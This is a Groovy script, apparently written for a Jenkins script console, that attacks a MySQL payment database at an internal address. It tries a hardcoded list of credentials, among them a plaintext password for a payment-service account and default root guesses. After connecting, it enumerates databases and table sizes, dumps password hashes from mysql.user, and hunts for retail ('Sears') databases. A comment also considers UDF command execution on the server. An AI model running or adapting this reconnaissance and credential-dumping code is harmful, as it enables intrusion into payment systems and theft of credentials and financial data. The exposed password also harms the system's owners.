// MySQL via JDBC directo desde Jenkins (Java)
// No subprocess - coneccion Java nativa
import java.sql.*

println "=== MYSQL JDBC T1PAGOS ==="

// Try MySQL JDBC connection
def tryJdbc = { host, port, user, pass, db ->
    def url = "jdbc:mysql://${host}:${port}/${db}?useSSL=false&serverTimezone=UTC&connectTimeout=10000&socketTimeout=30000"
    try {
        def conn = DriverManager.getConnection(url, user, pass)
        return conn
    } catch(e) {
        println "JDBC fail ${user}@${host}:${port}/${db}: ${e.message}"
        return null
    }
}

def runQuery = { conn, query ->
    try {
        def stmt = conn.createStatement()
        def rs = stmt.executeQuery(query)
        def meta = rs.metaData
        def cols = meta.columnCount
        def rows = []
        while (rs.next()) {
            def row = []
            (1..cols).each { i -> row << (rs.getString(i) ?: "NULL") }
            rows << row.join(" | ")
        }
        rs.close()
        stmt.close()
        return rows
    } catch(e) {
        return ["ERROR: ${e.message}"]
    }
}

// MySQL JDBC drivers to try
def drivers = [
    "com.mysql.jdbc.Driver",
    "com.mysql.cj.jdbc.Driver",
    "org.mariadb.jdbc.Driver"
]
drivers.each { d ->
    try {
        Class.forName(d)
        println "JDBC Driver loaded: ${d}"
    } catch(e) {
        // not available
    }
}

// Test credentials
def connCreds = [
    ["172.27.141.4", 3306, "root", "", ""],
    ["172.27.141.4", 3306, "app_t1", "wUt22Us2CUh#+M=", "payment_t1"],
    ["172.27.141.4", 3306, "root", "root", ""],
]

def conn = null
connCreds.each { cred ->
    if (conn != null) return
    def c = tryJdbc(cred[0], cred[1], cred[2], cred[3], cred[4])
    if (c != null) {
        conn = c
        println "CONNECTED as ${cred[2]}@${cred[0]}:${cred[1]}"
    }
}

if (conn != null) {
    println "\n--- SHOW DATABASES ---"
    runQuery(conn, "SHOW DATABASES").each { println "  " + it }
    
    println "\n--- payment_t1 TABLES ---"
    runQuery(conn, "SHOW TABLES IN payment_t1").each { println "  " + it }
    
    println "\n--- TABLE ROW COUNTS ---"
    def bigTables = runQuery(conn, """SELECT table_schema, table_name, table_rows 
        FROM information_schema.tables 
        WHERE table_schema NOT IN ('information_schema','mysql','performance_schema') 
        ORDER BY table_rows DESC LIMIT 20""")
    bigTables.each { println "  " + it }
    
    println "\n--- USERS WITH AUTH ---"
    runQuery(conn, "SELECT user, host, password FROM mysql.user LIMIT 20").each { println "  " + it }
    
    println "\n--- PROBE TO PROD SEARS FROM DB SERVER ---"
    // Use sys_exec or UDF if available
    def udfTest = runQuery(conn, "SELECT @@hostname, @@version, @@datadir")
    udfTest.each { println "  " + it }
    
    // Check if there's a SEARS database
    def searsDbs = runQuery(conn, "SHOW DATABASES").findAll { it.toLowerCase().contains("sears") || it.toLowerCase().contains("tienda") || it.toLowerCase().contains("mrc") }
    println "\n--- SEARS RELATED DATABASES ---"
    searsDbs.each { println "  " + it }
    
    conn.close()
} else {
    println "NO JDBC CONNECTION - trying alternative approach"
    
    // Use Groovy socket + custom MySQL protocol
    println "\n--- SOCKET TEST TO MySQL ---"
    try {
        def s = new Socket("172.27.141.4", 3306)
        s.soTimeout = 5000
        def inp = s.inputStream
        def header = new byte[4]
        inp.read(header)
        def plen = ((header[0] & 0xFF) | ((header[1] & 0xFF) << 8) | ((header[2] & 0xFF) << 16))
        def data = new byte[plen]
        inp.read(data)
        def version = new String(data, 1, data.indexOf(0 as byte, 1) - 1, "latin1")
        println "MySQL socket connected! Server: ${version}"
        s.close()
    } catch(e) {
        println "Socket error: ${e.message}"
    }
}

println "\n=== FIN ==="
